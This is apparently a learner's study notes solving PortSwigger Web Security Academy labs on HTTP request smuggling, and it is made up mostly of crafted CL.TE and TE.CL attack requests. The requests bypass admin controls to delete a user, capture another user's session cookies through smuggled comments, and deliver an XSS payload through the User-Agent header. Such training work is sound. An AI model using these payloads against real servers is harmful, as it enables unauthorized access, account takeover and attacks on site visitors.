---
created: 2026-06-06
---
- Order:
	1. [[#13. HTTP request smuggling, basic CL.TE vulnerability]]
	2. [[#14. HTTP request smuggling, basic TE.CL vulnerability]]
	3. [[#15. HTTP request smuggling, obfuscating the TE header]]
	4. [[#1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses]]
	5. [[#2. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses]]
	6. [[#3. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability]]
	7. [[#4. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability]]

 

| `#`   | Solved? | Name                                                                                         | Date    | Notes |
| ----- | ------- | -------------------------------------------------------------------------------------------- | ------- | ----- |
| `1.`  | `✓`     | HTTP request smuggling, confirming a CL.TE vulnerability via differential responses          | `16.06` |       |
| `2.`  | `✓`     | HTTP request smuggling, confirming a TE.CL vulnerability via differential responses          | `09.07` |       |
| `3.`  | `✓`     | Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability | `09.07` |       |
| `4.`  | `✓`     | Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability | `09.07` |       |
| `5.`  | `✓`     | Exploiting HTTP request smuggling to reveal front-end request rewriting                      | `09.07` |       |
| `6.`  | `✓`     | Exploiting HTTP request smuggling to capture other users' requests                           | `09.07` |       |
| `7.`  | `✓`     | Exploiting HTTP request smuggling to deliver reflected XSS                                   | `10.07` |       |
| `8.`  |         | Response queue poisoning via H2.TE request smuggling                                         |         |       |
| `9.`  |         | H2.CL request smuggling                                                                      |         |       |
| `10.` |         | HTTP/2 request smuggling via CRLF injection                                                  |         |       |
| `11.` |         | HTTP/2 request splitting via CRLF injection                                                  |         |       |
| `12.` |         | CL.0 request smuggling                                                                       |         |       |
| `13.` | `✓`     | HTTP request smuggling, basic CL.TE vulnerability                                            | `15.06` |       |
| `14.` | `✓`     | HTTP request smuggling, basic TE.CL vulnerability                                            | `15.06` |       |
| `15.` | `✓`     | HTTP request smuggling, obfuscating the TE header                                            | `09.07` |       |


## 1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

>[!done]

>[!note]+ Lab description
> - [`Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses`](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.
### Solution

- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Send a detection request:

```http
POST / HTTP/1.1
Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3␍␊
ABC␍␊
X␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab1/1.png]]

- The request times out. This is a very strong indication for `CL.TE` HRS vulnerability. 
- The front-end uses `Content-Length` and forwards only `6` bytes to the back-end `3␍␊ABC`. The back-end uses `Transfer-Encoding: chunked` and waits for the next chunk size, which never comes, and the request times out.

- To confirm `CL.TE`, send the following request twice:

```http
POST / HTTP/1.1
Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0␍␊
␍␊
GET /404 HTTP/1.1␍␊
X-Ignore: X
```

>[!warning] Do not add a newline after `X-Ignore: X`.

- `Content-Length` should cover the whole body:

![[images/walkthrough/PortSwigger/HRS/lab1/2.png]]

- As the second response you get `404 Not Found`:

![[images/walkthrough/PortSwigger/HRS/lab1/3.png]]

- Alternatively, you could send an attack request and then a normal request:
	
	1. Attack request:
	
	```http
	POST / HTTP/1.1
	Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 35
	Transfer-Encoding: chunked
	
	0␍␊
	␍␊
	GET /404 HTTP/1.1␍␊
	X-Ignore: X
	```


	1. Normal request:
	
	```http
	GET / HTTP/1.1
	Host: 0a9100ac045190a48181d4360070009f.web-security-academy.net
	
	```

- One after another. 
- As a response to the normal one, you get `/404`:

![[images/walkthrough/PortSwigger/HRS/lab1/4.png]]

![[images/walkthrough/PortSwigger/HRS/lab1/solved.png]]

Solved!

## 2. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

>[!done]

>[!note]+ Lab description
> - [`Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses`](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.
### Solution

- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Send a detection request:

```http
POST / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3␍␊
ABC␍␊
X␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab2/1.png]]

- The request is rejected by front-end. This means that the front-end parses the request body using `Transfer-Encoding: chunked`; it reads the first chunk, and then expect the next chunk size (in hex) after `ABC`, but encounters `X`, which is invalid size. The back-end doesn't receive this request at all. 

- Send another probe:

```http
POST / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0␍␊
␍␊
X
```

- The front-end uses `chunked` encoding, therefore considers the request complete after `0␍␊␍␊`, `X` is omitted. If the back-end uses `Transfer-Encoding: chunked`, there will be no problem and you will get `200 OK` in response. But if it uses `Content-Length`, you will get a timeout instead: the back-end will wait for all `6` bytes to arrive until the request times out.

![[images/walkthrough/PortSwigger/HRS/lab2/2.png]]

- In this case, the request times out, which is a strong indicator of `TE.CL` request smuggling vulnerability. 

---

- To confirm the `TE.CL` HRS via differential responses, we want the front-end server to deliver the entire smuggled request to the backend, so we'll put the zero-chunk `0` at the very end:

```http
POST / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

<chunk size>␍␊
SMUGGLED REQUEST
0␍␊
␍␊
```

- The chunk size will include the entire request we want to transmit to the back-end.
- `Content-Length`, used by the back-end, covers everything before the start of the smuggled request (`1-2`-byte chunk size + CRLF). The back-end sees the first request which is just the chunk size + CRLF. The request we smuggle is treated separately. 

```http
POST / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

52␍␊
GET /404 HTTP/1.1␍␊
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab2/3.png]]

![[images/walkthrough/PortSwigger/HRS/lab2/4.png]]

- For the `0` chunk to not cause any problem on the back-end, make it as if it is part of the smuggled body.


```http
POST / HTTP/1.1
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9d␍␊
GET /404 HTTP/1.1␍␊
Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net␍␊
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
␍␊
X=␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab2/5.png]]

- Send this request twice. On the second, you'll get `404 Not Found`:

![[images/walkthrough/PortSwigger/HRS/lab2/6.png]]

- Alternatively, send an attack request and then a normal request:
	
	- Attack request:
	
	```http
	POST / HTTP/1.1
	Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 4
	Transfer-Encoding: chunked
	
	9d␍␊
	GET /404 HTTP/1.1␍␊
	Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net␍␊
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 99
	␍␊
	X=␍␊
	0␍␊
	␍␊
	```
	
	- Normal request (first make sure it is valid alone):
	
	```http
	GET / HTTP/1.1
	Host: 0aaa0071035c2af08088853c005c00f4.web-security-academy.net
	```

- Send consequentially:

![[images/walkthrough/PortSwigger/HRS/lab2/7.png]]

![[images/walkthrough/PortSwigger/HRS/lab2/solved.png]]

Solved!
## 3. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

>[!note]+ Lab description
> - [`Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability`](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
> 
> To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.
### Solution

- Access to the `/admin` page is blocked:

![[images/walkthrough/PortSwigger/HRS/lab3/1.png]]

- If the access is blocked by the front-end server, the restriction may be bypassed using HTTP request smuggling.
- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.

- Send the first probe request:

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
␍␊
3␍␊
ABC␍␊
X␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab3/2.png]]

- You get a timeout, which indicates a `CL.TE` request smuggling. 
- Confirm the vulnerability:

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0␍␊
␍␊
X
```

![[images/walkthrough/PortSwigger/HRS/lab3/3.png]]

- Next, you need to confirm you can actually smuggle requests and receive answers. 
- Smuggle a request that will get you `404 Not Found` (send the following twice):

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Transfer-Encoding: chunked

0␍␊
␍␊
GET /nonexistent HTTP/1.1␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab3/4.png]]

- You receive an error: `"Invalid request"`. That is because, when the second request is appended to the smuggled one, you get something like:

```http
GET /nonexistent HTTP/1.1
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
...
```

- `GET` and `POST` methods are present, which is clearly invalid. 
- To get the second request like ignored, add a header like `X-Ignore` (so request line of the second request is appended as the value of that header):

![[images/walkthrough/PortSwigger/HRS/lab3/5.png]]

- On the second request, you get `"Not Found"`, which means you can smuggle requests.
- Replace `/nonexistent` with `/admin`. This time, for clarity, separate an attack request and a normal request instead of sending the same one twice. 
- Attack request:

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0␍␊
␍␊
GET /admin HTTP/1.1␍␊
X-Ignore: x
```

- Normal request:

```http
GET / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net

```

![[images/walkthrough/PortSwigger/HRS/lab3/6.png]]

- You see `401 Unauthorized` with the message: `Admin interface only available to local users`.
- To bypass this, add `Host: localhost` to the attack request, then send the sequence again:

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0␍␊
␍␊
GET /admin HTTP/1.1␍␊
Host: localhost␍␊
X-Ignore: x
```

![[images/walkthrough/PortSwigger/HRS/lab3/7.png]]

- This time, the error says: `"Duplicate header names are not allowed"`.
- This happens because when the normal request is appended to the smuggled, you get:

```http
GET /admin HTTP/1.1
Host: localhost
X-Ignore: xGET / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net

```

- Here are two `Host` headers, which the back-end detects and errors. `X-Ignore` handles only one line, but for multiple ones, we need a different approach.
- To get everything we don't need ignored, we will stuff it in the smuggled requests's body.

- Send the following request twice:

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Transfer-Encoding: chunked

0␍␊
␍␊
GET /admin HTTP/1.1␍␊
Host: localhost␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 100␍␊
␍␊
x=
```

![[images/walkthrough/PortSwigger/HRS/lab3/8.png]]

- Delete the user `carlos` by sending the following request twice:

```http
POST / HTTP/1.1
Host: 0a54003104792bf6804e7cb2001400c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Transfer-Encoding: chunked

0␍␊
␍␊
GET /admin/delete?username=carlos HTTP/1.1␍␊
Host: localhost␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 100␍␊
␍␊
x=
```

![[images/walkthrough/PortSwigger/HRS/lab3/9.png]]

![[images/walkthrough/PortSwigger/HRS/lab3/solved.png]]

Solved!
## 4. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability`](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
> 
> To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

### Solution

- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Since we already know this is `TE.CL`, we will skip detection and confirmation this time.

- First confirm you can smuggle requests.
- Attack request:

```http
POST / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

2e␍␊
GET /nonexistent HTTP/1.1␍␊
Content-Length: 6␍␊
␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab4/1.png]]

- Normal request:

```http
GET / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net

```

![[images/walkthrough/PortSwigger/HRS/lab4/2.png]]

- You get `404 Not Found`, which means the normal request was appended to the smuggled one. 
- Now change `/nonexistent` to `/admin` in the attack request and add `Host: localhost`:

- Attack request: 

```http
POST / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

39␍␊
GET /admin HTTP/1.1␍␊
Host: localhost␍␊
Content-Length: 6␍␊
␍␊
0␍␊
␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab4/3.png]]

- Normal request:

```http
GET / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net


```

![[images/walkthrough/PortSwigger/HRS/lab4/4.png]]

- You get access to the admin panel.
- Delete the `carlos` user by changing the attack request to:

```http
POST / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

50
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 6

0


```

![[images/walkthrough/PortSwigger/HRS/lab4/5.png]]


![[images/walkthrough/PortSwigger/HRS/lab4/solved.png]]

Solved!
## 5. Exploiting HTTP request smuggling to reveal front-end request rewriting

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting`](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> There's an admin panel at `/admin`, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name.
> 
> To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user `carlos`.

### Solution

- If you try to access `/admin` as-is, you'll get `401 Unauthorized` with the message: `Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1`.

![[images/walkthrough/PortSwigger/HRS/lab5/1.png]]

---

- Send a `GET` request to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Send the first probe:

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
ABC
X

```

![[images/walkthrough/PortSwigger/HRS/lab5/2.png]]

- You get  timeout.
- Confirm `CL.TE`:

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

```

![[images/walkthrough/PortSwigger/HRS/lab5/3.png]]

---

- Next, smuggle request to `/admin`.
- Attack request:

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=
```

- Normal request:

```http
GET / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net

```

![[images/walkthrough/PortSwigger/HRS/lab5/4.png]]

- Still `401 Unauthorized`.
- Add an `X-Forwareded-For` header to the attack request:


```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
X-Forwarded-For: 127.0.0.1

x=
```

![[images/walkthrough/PortSwigger/HRS/lab5/5.png]]

- And still receive the same error.
- This means that there's some other header than `X-Forwarded-For` used to indicate the source address of the request by the front-end. To get it, you need to capture what front-end sends exactly. 

---

- The blog search functionality implemented via `POST` can be exploited just for that purpose — because it reflects the value of the `search` `POST` body parameter in the response exactly:

![[images/walkthrough/PortSwigger/HRS/lab5/6.png]]

- Change your attack request to:

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=test
```

- Normal request:

```http
GET / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net


```

![[images/walkthrough/PortSwigger/HRS/lab5/7.png]]

- You get the header name reflected in the response (to get more of the request, increase the `Content-Length` of the smuggled request).

---

- Smuggle a `GET` to `/admin` again, but this time send the discovered header set to `127.0.0.1` (instead of `X-Forwareded-For`):

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
X-SfSzlv-Ip: 127.0.0.1

```

![[images/walkthrough/PortSwigger/HRS/lab5/8.png]]

- Delete the `carlos` user using:

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
X-SfSzlv-Ip: 127.0.0.1


```

![[images/walkthrough/PortSwigger/HRS/lab5/9.png]]

![[images/walkthrough/PortSwigger/HRS/lab5/solved.png]]

Solved!
## 6. Exploiting HTTP request smuggling to capture other users' requests

>[!done]


>[!note]+ Lab description
> - [`Lab: Exploiting HTTP request smuggling to capture other users' requests`](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

### Solution

- Detect request smuggling first. 
- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Send the first probe:

```http
POST / HTTP/1.1
Host: 0a72007603e8a25080fc3f57008f00c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
ABC
X

```

![[images/walkthrough/PortSwigger/HRS/lab6/1.png]]

- You get a timeout, which suggests `CL.TE`.

- Confirm it:

```http
POST / HTTP/1.1
Host: 0a72007603e8a25080fc3f57008f00c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

![[images/walkthrough/PortSwigger/HRS/lab6/2.png]]

---

- See the application has a comment functionality:

![[images/walkthrough/PortSwigger/HRS/lab6/3.png]]

- Let's try using it to post a comment with someone's else request — along with their cookies — as a comment.
- First send this comment request to `Repeater` and change parameters so that `comment` appears the last. Verify the application accepts it:

![[images/walkthrough/PortSwigger/HRS/lab6/4.png]]

---

- Attack request:

```http
POST / HTTP/1.1
Host: 0a72007603e8a25080fc3f57008f00c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 281
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=YC4SoKojJVixyv8JMoK9A4eR9sAAKtkX
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

csrf=VPS3XF2V4jVWsvefPcNkduR2vHsqVaGI&postId=5&name=name&email=email%40example.com&website=https%3A%2F%2Fexample.com&comment=
```

- Some notes:
	- Make sure to include both the `session` cookie and the `csrf` token. 
	- `Content-Length` of the `POST` to `/` needs to include everything up to the last `comment=` (but no newline at the end).

- Go to the comment sections of the respective post and see some parts of a request reflected:

![[images/walkthrough/PortSwigger/HRS/lab6/5.png]]

- Increase the `Content-Length` of the smuggled request to see more:

```http
POST / HTTP/1.1
Host: 0a72007603e8a25080fc3f57008f00c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 281
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=YC4SoKojJVixyv8JMoK9A4eR9sAAKtkX
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

csrf=VPS3XF2V4jVWsvefPcNkduR2vHsqVaGI&postId=5&name=name&email=email%40example.com&website=https%3A%2F%2Fexample.com&comment=
```

- Send some of these and update the comment section. One of the reflected requests should contain the session cookie you need:

![[images/walkthrough/PortSwigger/HRS/lab6/6.png]]

- Slowly increase the `Content-Length` in the smuggled request until you get the cookie reflected in a comment. After some (I spent many) attempts, you will catch the complete victim's cookies:

![[images/walkthrough/PortSwigger/HRS/lab6/7.png]]

- Use them to access `/my-account`:

![[images/walkthrough/PortSwigger/HRS/lab6/solved.png]]

Solved!
## 7. Exploiting HTTP request smuggling to deliver reflected XSS

>[!note]+ Lab description
> - [`Lab: Exploiting HTTP request smuggling to deliver reflected XSS`](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> The application is also vulnerable to reflected XSS via the `User-Agent` header.
> 
> To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.

### Solution

- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Send a first probe request:

```http
POST / HTTP/1.1
Host: 0a390091049e753d8089b2ba00e200eb.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
ABC
X

```

![[images/walkthrough/PortSwigger/HRS/lab7/1.png]]

- You get a timeout, which suggests `CL.TE` HRS.
- Confirm it:

```http
POST / HTTP/1.1
Host: 0a390091049e753d8089b2ba00e200eb.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

![[images/walkthrough/PortSwigger/HRS/lab7/2.png]]

---

- Navigate to any blog post and inspect the comment section. See there's a hidden comment field, `uesrAgent` with the default value set to your `User-Agent`:

![[images/walkthrough/PortSwigger/HRS/lab7/3.png]]

- Send a `GET` to the blog post to `Repeater` and change the `User-Agent` header to see if it's reflected on the page:

![[images/walkthrough/PortSwigger/HRS/lab7/4.png]]

- See the header value is indeed reflected in the response, inside an HTML attribute value.
- Escape the context using:

```bash
User-Agent: test123"><script>alert(1)</script>
```

![[images/walkthrough/PortSwigger/HRS/lab7/5.png]]

- You can test if `alert()` fires by changing the header in `Proxy` -> `Intercept`:

![[images/walkthrough/PortSwigger/HRS/lab7/6.png]]

![[images/walkthrough/PortSwigger/HRS/lab7/7.png]]


---

- Now you have to smuggle a request with the poisoned header, similar to now you smuggled `GPOST` before.
- Send the attack request:

```http
POST / HTTP/1.1
Host: 0a390091049e753d8089b2ba00e200eb.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Transfer-Encoding: chunked

0

GET /post?postId=2 HTTP/1.1
User-Agent: test123"><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

- Then navigate to the same blog post page:

![[images/walkthrough/PortSwigger/HRS/lab7/8.png]]

![[images/walkthrough/PortSwigger/HRS/lab7/solved.png]]

Solved!
## 8. Response queue poisoning via H2.TE request smuggling

>[!note]+ Lab description
- [`Lab: Response queue poisoning via H2.TE request smuggling`](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
- Level: #Practitioner 
### Solution

## 9. H2.CL request smuggling

>[!note]+ Lab description
- [`Lab: H2.CL request smuggling`](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)
- Level: #Practitioner 
### Solution

## 10. HTTP/2 request smuggling via CRLF injection

>[!note]+ Lab description
- [`Lab: HTTP/2 request smuggling via CRLF injection`](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)
- Level: #Practitioner 
### Solution
## 11. HTTP/2 request splitting via CRLF injection

>[!note]+ Lab description
- [`Lab: HTTP/2 request splitting via CRLF injection`](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
- Level: #Practitioner 

### Solution
## 12. CL.0 request smuggling

>[!note]+ Lab description
- [`Lab: CL.0 request smuggling`](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)
- Level: #Practitioner 

### Solution
## 13. HTTP request smuggling, basic CL.TE vulnerability

>[!done]

>[!note]+ Lab description
> - [`Lab: HTTP request smuggling, basic CL.TE vulnerability`](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the `GET` or `POST` method.
> 
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.
### Solution

- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- Send the following detection request:

```http
POST / HTTP/1.1
Host: 0a6000d50461ab04817b752500b00014.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
ABC
X
```

![[images/walkthrough/PortSwigger/HRS/lab13/1.png]]


- To confirm CL.TE, send the following request twice:

```http
POST / HTTP/1.1
Host: 0a6000d50461ab04817b752500b00014.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

![[images/walkthrough/PortSwigger/HRS/lab13/2.png]]

- You get `Unrecognized method GPOST`, which means `G` was appended to the second request. 


![[images/walkthrough/PortSwigger/HRS/lab13/solved.png]]

Solved!
## 14. HTTP request smuggling, basic TE.CL vulnerability

>[!done]

>[!note]+ Lab description
> - [`Lab: HTTP request smuggling, basic TE.CL vulnerability`](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
> - Level: #Practitioner 
> 
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.
> 
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.
### Solution

- Send a `GET` to `/` to `Repeater` and prepare `Repeater` for request smuggling.
- To detect the vulnerability, send the following request:

```http
POST / HTTP/1.1
Host: 0a08000f045e2cd480cf5d0000a100e0.web-security-academy.net
Cookie: session=V4zbTQloHQbRb0UPiw8tQQxpcmq16Zzx
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3␍␊
ABC␍␊
X␍␊
```

![[images/walkthrough/PortSwigger/HRS/lab14/1.png]]

